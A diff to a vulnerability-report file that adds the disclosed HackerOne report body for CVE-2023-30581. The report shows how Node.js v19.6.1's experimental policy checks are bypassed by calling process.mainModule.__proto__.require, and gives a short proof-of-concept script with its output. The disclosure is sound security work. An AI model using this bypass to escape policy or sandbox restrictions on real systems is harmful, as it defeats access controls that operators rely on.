@@ -9,6 +9,7 @@ tags:
 substate: "resolved"
 weakness: "Privilege Escalation"
 enriched: true
+body: true
 date: 2023-07-20
 submitted: 2023-02-17T17:58:20.197Z
 bounty_usd: null
@@ -26,6 +27,47 @@ title: "The use of __proto__ in process.mainModule.__proto__.require() bypasses 
 - Report: [https://hackerone.com/reports/1877919](https://hackerone.com/reports/1877919)
 - CWE: Privilege Escalation | CVE: CVE-2023-30581
 - Submitted: 2023-02-17T17:58:20.197Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+process.mainModule.require() correctly works with permission system in Node v19.6.1. 
+But the use of \_\_proto\_\_  in process.mainModule.\_\_proto\_\_.require() can bypass the check.
+
+# Description and STR
+Consider the following policy.json:
+`````
+{
+  "resources": {
+    "./proc.js": {
+      "integrity": true
+    }
+  }
+}
+`````
+The policy only allows proc.js file to be loaded without any dependencies.
+
+However with the following proc.js
+`````
+const os = process.mainModule.__proto__.require("os")
+
+console.log(process.version)
+console.log(os.version())
+`````
+We get the output:
+`````
+└─$ ../node-v19.6.1-linux-x64/bin/node --experimental-policy=policy.json proc.js
+v19.6.1
+#1 SMP PREEMPT Debian 5.16.18-1kali1 (2022-04-01)
+(node:2720) ExperimentalWarning: Policies are experimental.
+(Use `node --trace-warnings ...` to show where the warning was created)
+`````
+Therefore os dependency can be loaded and os.version executed even if unspecified in permission system.
+
+## Impact
+
+Bypass the permission system
 
 ## Timeline
 
